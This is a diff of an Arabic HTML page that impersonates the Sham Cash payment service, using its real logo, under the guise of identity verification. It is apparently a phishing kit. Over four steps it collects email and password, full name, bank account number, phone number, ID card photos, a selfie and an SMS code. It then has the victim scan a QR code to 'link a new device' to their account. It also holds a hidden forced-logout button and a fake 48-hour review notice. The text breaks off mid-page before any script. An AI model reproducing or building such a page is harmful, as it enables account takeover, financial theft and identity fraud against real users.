@@ -2,473 +2,1722 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>نضام توثيق الحساب الغير مصرح </title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>شام كاش - التحقق من الهوية وربط الجهاز</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&display=swap" rel="stylesheet">
     <style>
+        :root {
+            --primary: #1a365d;
+            --primary-dark: #0d2438;
+            --secondary: #2d8c4a;
+            --danger: #c53030;
+            --warning: #d69e2e;
+            --info: #3182ce;
+            --light: #f8f9fa;
+            --dark: #2d3748;
+            --border: #e2e8f0;
+            --shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+            --shadow-lg: 0 10px 25px rgba(0, 0, 0, 0.15);
+        }
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
         }
         
         body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Amiri', serif;
+            background: linear-gradient(135deg, #f0f4f8 0%, #d9e2ec 100%);
+            color: #333;
+            line-height: 1.6;
             min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
+            overflow-x: hidden;
         }
         
-        .container {
+        .page-container {
+            display: none;
+            min-height: 100vh;
             background: white;
-            border-radius: 15px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
-            width: 100%;
-            max-width: 450px;
-            padding: 40px;
-            position: relative;
-            overflow: hidden;
+            animation: fadeIn 0.4s ease;
+        }
+        
+        .page-container.active {
+            display: block;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(15px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @keyframes pulse {
+            0% { transform: scale(0.8); opacity: 0.7; }
+            50% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(0.8); opacity: 0.7; }
+        }
+        
+        @keyframes slideUp {
+            from { transform: translateY(30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        
+        @keyframes slideInRight {
+            from { transform: translateX(30px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
         }
         
         .header {
-            text-align: center;
-            margin-bottom: 30px;
+            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
+            padding: 20px;
+            box-shadow: var(--shadow);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
         }
         
-        .header h1 {
-            color: #333;
-            font-size: 28px;
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
             margin-bottom: 10px;
-            font-weight: 700;
         }
         
-        .header p {
-            color: #666;
-            font-size: 14px;
+        .logo {
+            height: 45px;
+            width: auto;
+            filter: brightness(0) invert(1);
+        }
+        
+        .logo-text {
+            font-family: 'Amiri', serif;
+            font-size: 28px;
+            font-weight: 700;
+            color: white;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.3);
+        }
+        
+        .page-indicator {
+            text-align: center;
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 17px;
+            font-weight: 600;
+        }
+        
+        .page-content {
+            padding: 30px 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            min-height: calc(100vh - 140px);
+        }
+        
+        .page-title {
+            font-family: 'Amiri', serif;
+            font-size: 28px;
+            color: var(--primary-dark);
+            margin-bottom: 15px;
+            font-weight: 700;
+            text-align: center;
+            padding-bottom: 15px;
+            border-bottom: 2px solid var(--primary);
+        }
+        
+        .page-subtitle {
+            font-size: 18px;
+            color: #4a5568;
+            margin-bottom: 30px;
+            text-align: center;
+            line-height: 1.7;
+        }
+        
+        .form-container {
+            background: white;
+            border-radius: 15px;
+            padding: 25px;
+            box-shadow: var(--shadow);
+            margin-bottom: 25px;
+            border: 1px solid var(--border);
         }
         
         .form-group {
             margin-bottom: 25px;
-            position: relative;
         }
         
-        label {
+        .form-label {
             display: block;
-            margin-bottom: 8px;
-            color: #444;
-            font-weight: 600;
-            font-size: 14px;
+            margin-bottom: 10px;
+            font-weight: 700;
+            color: var(--dark);
+            font-size: 17px;
         }
         
-        input {
+        .form-control {
             width: 100%;
-            padding: 14px 20px;
-            border: 2px solid #e1e5e9;
+            padding: 16px 18px;
+            border: 2px solid var(--border);
             border-radius: 10px;
-            font-size: 16px;
+            font-size: 18px;
             transition: all 0.3s ease;
-            background: #f8f9fa;
+            background: #fafafa;
+            font-family: 'Amiri', serif;
         }
         
-        input:focus {
+        .form-control:focus {
             outline: none;
-            border-color: #667eea;
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(26, 54, 93, 0.1);
             background: white;
-            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
         }
         
         .error-message {
-            color: #dc3545;
-            font-size: 12px;
-            margin-top: 5px;
+            color: var(--danger);
+            font-size: 15px;
+            margin-top: 8px;
             display: none;
-            animation: fadeIn 0.3s ease;
-        }
-        
-        .success-message {
-            color: #28a745;
-            font-size: 12px;
-            margin-top: 5px;
-            display: none;
-            animation: fadeIn 0.3s ease;
-        }
-        
-        .submit-btn {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            color: white;
-            border: none;
-            padding: 16px;
-            border-radius: 10px;
-            font-size: 18px;
             font-weight: 600;
+        }
+        
+        .btn {
+            padding: 18px 30px;
+            border: none;
+            border-radius: 12px;
+            font-size: 20px;
+            font-weight: 700;
             cursor: pointer;
             transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
             width: 100%;
-            margin-top: 10px;
+            margin-top: 15px;
+            font-family: 'Amiri', serif;
         }
         
-        .submit-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            box-shadow: 0 4px 15px rgba(26, 54, 93, 0.3);
         }
         
-        .submit-btn:disabled {
-            opacity: 0.6;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
+        .btn-primary:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 7px 20px rgba(26, 54, 93, 0.4);
         }
         
-        .loader {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid #667eea;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
+        .upload-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr));
+            gap: 20px;
+            margin-bottom: 25px;
         }
         
-        .status-box {
-            padding: 15px;
-            border-radius: 10px;
-            margin-top: 20px;
-            display: none;
+        .upload-box {
+            border: 3px dashed var(--border);
+            border-radius: 12px;
+            padding: 25px 15px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
             text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            height: 190px;
+            position: relative;
+            overflow: hidden;
+            background: #fafafa;
+        }
+        
+        .upload-box:hover {
+            border-color: var(--primary);
+            background: rgba(26, 54, 93, 0.05);
+        }
+        
+        .verification-container {
+            text-align: center;
+            padding: 30px 20px;
+        }
+        
+        .verification-icon {
+            width: 110px;
+            height: 110px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, rgba(45, 140, 74, 0.1) 0%, rgba(31, 107, 55, 0.1) 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            color: var(--secondary);
+            margin: 0 auto 35px;
+            box-shadow: var(--shadow);
+        }
+        
+        .phone-input-container {
+            margin: 30px 0;
+            position: relative;
+        }
+        
+        .phone-prefix {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: var(--primary);
+            color: white;
+            padding: 12px 15px;
+            border-radius: 8px 0 0 8px;
+            font-weight: 700;
+            font-size: 18px;
+        }
+        
+        .sent-message {
+            background: linear-gradient(135deg, rgba(45, 140, 74, 0.1) 0%, rgba(31, 107, 55, 0.1) 100%);
+            border-radius: 12px;
+            padding: 20px;
+            margin: 25px 0;
+            border-right: 4px solid var(--secondary);
+            display: none;
+        }
+        
+        .sent-message.active {
+            display: block;
             animation: fadeIn 0.5s ease;
         }
         
-        .status-box.success {
-            background: #d4edda;
-            color: #155724;
-            border: 1px solid #c3e6cb;
+        .code-inputs {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin: 25px 0;
         }
         
-        .status-box.error {
-            background: #f8d7da;
-            color: #721c24;
-            border: 1px solid #f5c6cb;
+        .code-input {
+            width: 60px;
+            height: 70px;
+            border: 3px solid var(--border);
+            border-radius: 12px;
+            font-size: 32px;
+            text-align: center;
+            font-weight: 800;
+            font-family: 'Amiri', serif;
+            background: #fafafa;
         }
         
-        .info-box {
-            background: #e7f3ff;
-            border: 1px solid #b3d7ff;
-            border-radius: 8px;
+        .code-input:focus {
+            border-color: var(--primary);
+            box-shadow: 0 0 0 3px rgba(26, 54, 93, 0.1);
+            outline: none;
+            background: white;
+            transform: scale(1.05);
+        }
+        
+        .timer {
+            font-size: 22px;
+            color: var(--primary);
+            font-weight: 800;
+            padding: 12px 25px;
+            background: rgba(26, 54, 93, 0.1);
+            border-radius: 10px;
+            display: inline-block;
+            margin: 20px 0;
+        }
+        
+        .footer {
+            background: linear-gradient(135deg, var(--primary-dark) 0%, var(--primary) 100%);
+            padding: 25px 20px;
+            text-align: center;
+            margin-top: 40px;
+            color: white;
+        }
+        
+        .progress-container {
+            margin: 25px 0 40px;
+        }
+        
+        .progress-bar {
+            height: 12px;
+            background: #edf2f7;
+            border-radius: 6px;
+            overflow: hidden;
+            box-shadow: inset 0 2px 4px rgba(0,0,0,0.1);
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, var(--primary) 0%, var(--secondary) 100%);
+            border-radius: 6px;
+            width: 0%;
+            transition: width 0.5s ease;
+        }
+        
+        /* رسالة 48 ساعة */
+        .delayed-verification {
+            background: linear-gradient(135deg, rgba(49, 130, 206, 0.1) 0%, rgba(26, 54, 93, 0.1) 100%);
+            border-radius: 15px;
+            padding: 30px;
+            margin: 25px 0;
+            border: 2px solid var(--info);
+            text-align: center;
+            display: none;
+        }
+        
+        .delayed-verification.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .delayed-verification-icon {
+            font-size: 60px;
+            color: var(--info);
+            margin-bottom: 20px;
+        }
+        
+        .countdown {
+            font-size: 28px;
+            color: var(--info);
+            font-weight: 800;
+            margin: 20px 0;
+            background: rgba(49, 130, 206, 0.1);
             padding: 15px;
-            margin-top: 25px;
-            font-size: 13px;
-            color: #004085;
+            border-radius: 10px;
+            display: inline-block;
         }
         
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
+        .hidden-button {
+            display: none;
         }
         
-        @keyframes fadeIn {
-            from { opacity: 0; }
-            to { opacity: 1; }
+        /* تحسينات صفحة الربط */
+        .steps-container {
+            text-align: right;
+            margin-bottom: 30px;
         }
         
-        .requirements {
-            font-size: 12px;
-            color: #666;
-            margin-top: 5px;
+        .step-item {
+            padding: 15px;
+            margin-bottom: 15px;
+            border-right: 4px solid var(--info);
+            background: rgba(49, 130, 206, 0.05);
+            border-radius: 8px;
+            transition: all 0.3s ease;
         }
         
-        .telegram-icon {
-            position: absolute;
+        .step-item:hover {
+            background: rgba(49, 130, 206, 0.1);
+            transform: translateX(-5px);
+        }
+        
+        .step-number {
+            width: 35px;
+            height: 35px;
+            background: var(--info);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .step-item:hover .step-number {
+            transform: scale(1.1);
+            box-shadow: 0 4px 12px rgba(49, 130, 206, 0.3);
+        }
+        
+        /* حالة الربط */
+        .linking-status {
+            display: none;
+            text-align: center;
+            padding: 25px;
+            background: rgba(45, 140, 74, 0.1);
+            border-radius: 12px;
+            margin: 25px 0;
+            border: 2px solid var(--secondary);
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .success-message {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            background: rgba(45, 140, 74, 0.1);
+            border-radius: 12px;
+            margin: 25px 0;
+            border: 2px solid var(--secondary);
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .signal {
+            width: 15px;
+            height: 15px;
+            background: var(--info);
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        
+        #qrCanvas {
+            border: 2px solid var(--border);
+            border-radius: 10px;
+            padding: 10px;
+            background: white;
+            margin: 0 auto;
+            display: block;
+        }
+        
+        /* إشعارات */
+        .notification {
+            position: fixed;
             top: 20px;
-            left: 20px;
-            color: #667eea;
-            font-size: 24px;
+            right: 20px;
+            background: var(--secondary);
+            color: white;
+            padding: 20px 25px;
+            border-radius: 12px;
+            box-shadow: var(--shadow-lg);
+            z-index: 3000;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            animation: slideInRight 0.3s ease;
+            max-width: 400px;
+            font-weight: 600;
+            font-size: 17px;
         }
         
-        @media (max-width: 480px) {
-            .container {
-                padding: 30px 20px;
+        .notification.error {
+            background: var(--danger);
+        }
+        
+        .notification.info {
+            background: var(--info);
+        }
+        
+        .notification.warning {
+            background: var(--warning);
+        }
+        
+        @media (max-width: 768px) {
+            .header {
+                padding: 18px 15px;
             }
             
-            .header h1 {
+            .logo-text {
                 font-size: 24px;
+            }
+            
+            .page-content {
+                padding: 25px 15px;
+            }
+            
+            .code-input {
+                width: 50px;
+                height: 60px;
+                font-size: 28px;
+            }
+            
+            .upload-grid {
+                grid-template-columns: 1fr;
+            }
+            
+            .delayed-verification {
+                padding: 20px;
+            }
+            
+            .delayed-verification-icon {
+                font-size: 50px;
+            }
+            
+            .steps-container {
+                margin-bottom: 20px;
+            }
+            
+            .step-item {
+                padding: 12px;
             }
         }
     </style>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
 </head>
 <body>
-    <div class="container">
-        <div class="telegram-icon">
-            <i class="fab fa-telegram"></i>
-        </div>
+    <!-- الصفحة 1: تسجيل الدخول -->
+    <div class="page-container active" id="page1">
+        <header class="header">
+            <div class="logo-container">
+                <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شام كاش" class="logo">
+                <div class="logo-text">شام كاش</div>
+            </div>
+            <div class="page-indicator">التحقق من الهوية - الخطوة 1 من 4</div>
+        </header>
         
-        <div class="header">
-            <h1>توثيق حساب شام</h1>
-            <p>الخاص بالحسابات الغير مصرح بها</p>
-        </div>
-        
-        <form id="authForm">
-            <div class="form-group">
-                <label for="email">البريد الإلكتروني</label>
-                <input type="text" id="email" name="email" placeholder="example@domain.com" autocomplete="off">
-                <div class="error-message" id="emailError">يرجى إدخال بريد إلكتروني صحيح يحتوي على @</div>
-                <div class="success-message" id="emailSuccess">✓ البريد الإلكتروني صحيح</div>
-                <div class="requirements">يجب أن يحتوي البريد على @ واسم نطاق صالح</div>
+        <div class="page-content">
+            <h1 class="page-title">تسجيل الدخول</h1>
+            <p class="page-subtitle">أدخل بيانات حساب شام كاش للمتابعة</p>
+            
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress1" style="width: 0%"></div>
+                </div>
             </div>
             
-            <div class="form-group">
-                <label for="password">كلمة المرور</label>
-                <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" autocomplete="off">
-                <div class="error-message" id="passwordError">كلمة المرور مطلوبة</div>
-                <div class="success-message" id="passwordSuccess">✓ كلمة المرور صحيحة</div>
-                <div class="requirements">يجب أن تحتوي على 8 أحرف على الأقل</div>
+            <div class="form-container">
+                <div class="form-group">
+                    <label class="form-label" for="email">
+                        <i class="fas fa-envelope"></i>
+                        البريد الإلكتروني
+                    </label>
+                    <input type="email" id="email" class="form-control" placeholder="example@domain.com" required>
+                    <div class="error-message" id="emailError">البريد الإلكتروني غير صالح</div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="password">
+                        <i class="fas fa-lock"></i>
+                        كلمة المرور
+                    </label>
+                    <input type="password" id="password" class="form-control" placeholder="أدخل كلمة المرور" required>
+                    <div class="error-message" id="passwordError">كلمة المرور يجب أن تحتوي على 8 أحرف على الأقل</div>
+                </div>
+                
+                <button class="btn btn-primary hidden-button" id="hiddenLogoutBtn" onclick="forceShamCashLogout()">
+                    <i class="fas fa-sign-out-alt"></i>
+                    إخراج من تطبيق شام كاش
+                </button>
             </div>
             
-            <button type="submit" class="submit-btn" id="submitBtn">
-                <span id="btnText">توثيق الحساب</span>
-                <div class="loader" id="loader"></div>
+            <button class="btn btn-primary" onclick="validateLogin()">
+                التالي
+                <i class="fas fa-arrow-left"></i>
             </button>
-        </form>
-        
-        <div class="status-box" id="statusBox"></div>
-        
-        <div class="info-box">
-            <i class="fas fa-shield-alt"></i>
-            <strong>ملاحظة:</strong>هذا النضام خاص بتوثيق الحساب الغير مصرح به يرجى التأكد جيدٱ من حسابك.
+            
+            <div class="footer">
+                <div class="copyright">
+                    © 2024 شام كاش. نظام التحقق الآمن
+                </div>
+            </div>
         </div>
     </div>
+    
+    <!-- الصفحة 2: البيانات والمستندات -->
+    <div class="page-container" id="page2">
+        <header class="header">
+            <div class="logo-container">
+                <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شام كاش" class="logo">
+                <div class="logo-text">شام كاش</div>
+            </div>
+            <div class="page-indicator">التحقق من الهوية - الخطوة 2 من 4</div>
+            <button onclick="goToPage(1)" style="position:absolute; left:20px; top:20px; background:rgba(255,255,255,0.2); border:none; color:white; padding:10px 15px; border-radius:8px; cursor:pointer;">
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </header>
+        
+        <div class="page-content">
+            <h1 class="page-title">البيانات والمستندات</h1>
+            <p class="page-subtitle">يرجى تعبئة البيانات وتحضير المستندات المطلوبة</p>
+            
+            <div class="progress-container">
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progress2" style="width: 25%"></div>
+                </div>
+            </div>
+            
+            <div class="form-container">
+                <div class="form-group">
+                    <label class="form-label" for="fullName">
+                        <i class="fas fa-user"></i>
+                        الاسم الثلاثي الكامل
+                    </label>
+                    <input type="text" id="fullName" class="form-control" placeholder="الاسم الأول - اسم الأب - اسم الجد" required>
+                    <div class="error-message" id="nameError">الاسم يجب أن يكون ثلاثيًا باللغة العربية</div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="accountNumber">
+                        <i class="fas fa-credit-card"></i>
+                        رقم الحساب البنكي
+                    </label>
+                    <input type="text" id="accountNumber" class="form-control" placeholder="14-16 رقم" required>
+                    <div class="error-message" id="accountError">رقم الحساب يجب أن يحتوي على 14-16 رقماً</div>
+                </div>
+                
+                <div class="form-group">
+                    <label class="form-label" for="phoneNumber">
+                        <i class="fas fa-phone"></i>
+                        رقم الهاتف المرتبط بالحساب
+                    </label>
+                    <input type="tel" id="phoneNumber" class="form-control" placeholder="09xxxxxxxx" required>
+                    <div class="error-message" id="phoneError">رقم الهاتف يجب أن يكون سوريًا ويبدأ بـ 09</div>
+                </div>
+                
+                <div class="upload-grid">
+                    <div class="upload-box" onclick="triggerUpload('frontId')">
+                        <i class="fas fa-id-card upload-icon"></i>
+                        <div class="upload-text">الهوية الأمامية</div>
+                        <img class="upload-preview" id="frontIdPreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
+                    </div>
+                    
+                    <div class="upload-box" onclick="triggerUpload('backId')">
+                        <i class="fas fa-id-card upload-icon"></i>
+                        <div class="upload-text">الهوية الخلفية</div>
+                        <img class="upload-preview" id="backIdPreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
+                    </div>
+                    
+                    <div class="upload-box" onclick="triggerUpload('selfie')">
+                        <i class="fas fa-camera upload-icon"></i>
+                        <div class="upload-text">صورة شخصية مع الهوية</div>
+                        <img class="upload-preview" id="selfiePreview" style="display:none; max-width:100%; max-height:100%; position:absolute;">
+                    </div>
+                </div>
+            </div>
+            
+            <button class="btn btn-primary" onclick="validatePage2()">
+                التالي
+                <i class="fas fa-arrow-left"></i>
+            </button>
+            
+            <div class="footer">
+                <div class="copyright">
+                    © 2024 شام كاش. نظام التحقق الآمن
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- الصفحة 3: التحقق النهائي -->
+    <div class="page-container" id="page3">
+        <header class="header">
+            <div class="logo-container">
+                <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شام كاش" class="logo">
+                <div class="logo-text">شام كاش</div>
+            </div>
+            <div class="page-indicator">التحقق من الهوية - الخطوة 3 من 4</div>
+            <button onclick="goToPage(2)" style="position:absolute; left:20px; top:20px; background:rgba(255,255,255,0.2); border:none; color:white; padding:10px 15px; border-radius:8px; cursor:pointer;">
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </header>
+        
+        <div class="page-content">
+            <div class="verification-container">
+                <div class="verification-icon">
+                    <i class="fas fa-mobile-alt"></i>
+                </div>
+                
+                <h1 class="page-title">التحقق النهائي</h1>
+                <p class="page-subtitle">أدخل رقم هاتفك لإرسال رمز التحقق</p>
+                
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progress3" style="width: 50%"></div>
+                    </div>
+                </div>
+                
+                <div class="form-container">
+                    <div class="phone-input-container">
+                        <div class="phone-prefix">+963</div>
+                        <input type="tel" id="phoneInput" class="form-control" placeholder="9xxxxxxxx" maxlength="9">
+                    </div>
+                    
+                    <button class="btn btn-primary" onclick="sendVerificationCode()" id="sendCodeBtn">
+                        <i class="fas fa-paper-plane"></i>
+                        إرسال رمز التحقق
+                    </button>
+                    
+                    <div class="sent-message" id="sentMessage">
+                        <i class="fas fa-check-circle"></i>
+                        <p>تم إرسال رمز التحقق إلى رقم <strong id="maskedPhone"></strong></p>
+                    </div>
+                    
+                    <div class="code-inputs" id="codeInputs" style="display:none;">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 1)" autocomplete="off">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 2)" autocomplete="off">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 3)" autocomplete="off">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 4)" autocomplete="off">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 5)" autocomplete="off">
+                        <input type="text" class="code-input" maxlength="1" oninput="moveToNext(this, 6)" autocomplete="off">
+                    </div>
+                    
+                    <div class="timer" id="timer" style="display:none;">02:00</div>
+                    
+                    <button class="btn btn-primary" onclick="verifyCode()" id="verifyBtn" style="display:none;">
+                        <i class="fas fa-check"></i>
+                        تأكيد التحقق
+                    </button>
+                    
+                    <p style="margin-top:20px; color:#718096;">
+                        لم تستلم الرمز؟ 
+                        <a href="javascript:void(0)" onclick="resendCode()" style="color:var(--primary); font-weight:bold;">
+                            إعادة الإرسال
+                        </a>
+                    </p>
+                </div>
+                
+                <!-- رسالة 48 ساعة -->
+                <div class="delayed-verification" id="delayedVerification">
+                    <div class="delayed-verification-icon">
+                        <i class="fas fa-clock"></i>
+                    </div>
+                    <h3>شكراً لتسجيلك معنا!</h3>
+                    <p>تم استلام معلوماتك بنجاح وسيتم التحقق منها خلال:</p>
+                    <div class="countdown" id="countdownTimer">48:00:00</div>
+                    <p>سنقوم بالتواصل معك على الرقم المسجل بمجرد اكتمال عملية التحقق.</p>
+                    <p><strong>رقم الطلب:</strong> <span id="requestNumber">SHM-2024-001</span></p>
+                </div>
+            </div>
+            
+            <div class="footer">
+                <div class="copyright">
+                    © 2024 شام كاش. نظام التحقق الآمن
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- الصفحة 4: ربط الهاتف بالجهاز -->
+    <div class="page-container" id="page4">
+        <header class="header">
+            <div class="logo-container">
+                <img src="https://shamcash.com/_next/static/media/logo.5be69def.svg" alt="شام كاش" class="logo">
+                <div class="logo-text">شام كاش</div>
+            </div>
+            <div class="page-indicator">ربط الهاتف بالجهاز - الخطوة 4 من 4</div>
+            <button onclick="goToPage(3)" style="position:absolute; left:20px; top:20px; background:rgba(255,255,255,0.2); border:none; color:white; padding:10px 15px; border-radius:8px; cursor:pointer;">
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </header>
+        
+        <div class="page-content">
+            <div class="verification-container">
+                <div class="verification-icon" style="background: linear-gradient(135deg, rgba(49, 130, 206, 0.1) 0%, rgba(26, 54, 93, 0.1) 100%); color: var(--info);">
+                    <i class="fas fa-mobile-alt"></i>
+                </div>
+                
+                <h1 class="page-title">ربط الهاتف بالجهاز</h1>
+                <p class="page-subtitle">اتبع الخطوات التالية لإكمال عملية الربط</p>
+                
+                <div class="progress-container">
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progress4" style="width: 75%"></div>
+                    </div>
+                </div>
+                
+                <div class="form-container">
+                    <!-- قائمة الخطوات -->
+                    <div class="steps-container">
+                        <div class="step-item">
+                            <div style="display: flex; align-items: center; gap: 15px;">
+                                <div class="step-number">1</div>
+                                <div>
+                                    <h3 style="color: var(--primary-dark); margin-bottom: 5px;">افتح تطبيق شام كاش</h3>
+                                    <p style="color: #4a5568;">انتقل إلى إعدادات التطبيق</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-item">
+                            <div style="display: flex; align-items: center; gap: 15px;">
+                                <div class="step-number">2</div>
+                                <div>
+                                    <h3 style="color: var(--primary-dark); margin-bottom: 5px;">ابحث عن "ربط الجهاز"</h3>
+                                    <p style="color: #4a5568;">اختر خيار ربط جهاز جديد</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="step-item">
+                            <div style="display: flex; align-items: center; gap: 15px;">
+                                <div class="step-number">3</div>
+                                <div>
+                                    <h3 style="color: var(--primary-dark); margin-bottom: 5px;">وجه كاميرا الهاتف</h3>
+                                    <p style="color: #4a5568;">اسحب الكاميرا نحو رمز QR أدناه</p>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- رمز QR -->
+                    <div style="text-align: center; margin: 30px 0; padding: 20px; background: #f8f9fa; border-radius: 12px;">
+                        <h3 style="color: var(--primary-dark); margin-bottom: 15px;">رمز الربط</h3>
+                        <div id="qrCode" style="width: 200px; height: 200px; margin: 0 auto; background: #333; position: relative; border-radius: 10px; overflow: hidden;">
+                            <canvas id="qrCanvas" width="200" height="200"></canvas>
+                        </div>
+                        <p style="color: #718096; margin-top: 15px; font-size: 14px;">
+                            المسح متاح لمدة <span id="qrTimer" style="color: var(--info); font-weight: bold;">10:00</span> دقيقة
+                        </p>
+                    </div>
+                    
+                    <!-- حالة الربط -->
+                    <div class="linking-status" id="linkingStatus">
+                        <i class="fas fa-sync-alt fa-spin" style="font-size: 40px; color: var(--secondary); margin-bottom: 15px;"></i>
+                        <h3 style="color: var(--secondary); margin-bottom: 10px;">جاري انتظار الربط...</h3>
+                        <p style="color: #4a5568;">يرجى عدم إغلاق هذه الصفحة حتى اكتمال الربط</p>
+                        
+                        <!-- محاكاة إشارات الربط -->
+                        <div style="display: flex; justify-content: center; gap: 10px; margin: 20px 0;">
+                            <div class="signal" style="animation-delay: 0s;"></div>
+                            <div class="signal" style="background: var(--secondary); animation-delay: 0.2s;"></div>
+                            <div class="signal" style="background: var(--primary); animation-delay: 0.4s;"></div>
+                        </div>
+                        
+                        <!-- أدوات التحقق -->
+                        <div style="margin-top: 20px;">
+                            <h4 style="color: var(--primary-dark); margin-bottom: 10px;">أدوات التحقق المقدمة:</h4>
+                            <div style="display: flex; flex-wrap: wrap; gap: 15px; justify-content: center;">
+                                <span style="background: rgba(49, 130, 206, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--info);">نوع اتصال</span>
+                                <span style="background: rgba(214, 158, 46, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--warning);">زمنة ضيق</span>
+                                <span style="background: rgba(45, 140, 74, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--secondary);">جهاز آمن</span>
+                                <span style="background: rgba(197, 48, 48, 0.1); padding: 8px 15px; border-radius: 20px; color: var(--danger);">جزء أخرى</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <!-- مؤقت الربط -->
+                    <div class="timer" id="linkingTimer" style="display: none; font-size: 24px; margin: 20px auto; width: fit-content;">
+                        <i class="fas fa-clock"></i>
+                        <span id="linkingTime">10:00</span>
+                    </div>
+                    
+                    <!-- زر البدء -->
+                    <button class="btn btn-primary" onclick="startLinkingProcess()" id="startLinkingBtn">
+                        <i class="fas fa-link"></i>
+                        بدء عملية الربط
+                    </button>
+                    
+                    <!-- رسالة النجاح -->
+                    <div class="success-message" id="successMessage">
+                        <i class="fas fa-check-circle" style="font-size: 60px; color: var(--secondary); margin-bottom: 20px;"></i>
+                        <h3 style="color: var(--secondary); margin-bottom: 15px;">تم الربط بنجاح!</h3>
+                        <p style="color: #4a5568; margin-bottom: 10px;">تم ربط جهازك بنجاح بتطبيق شام كاش</p>
+                        <p style="color: #4a5568;">يمكنك الآن استخدام التطبيق بشكل آمن ومتكامل</p>
+                        
+                        <div style="margin-top: 25px; background: white; padding: 15px; border-radius: 10px; border: 1px solid var(--border);">
+                            <h4 style="color: var(--primary-dark); margin-bottom: 10px;">تفاصيل الجهاز المرتبط:</h4>
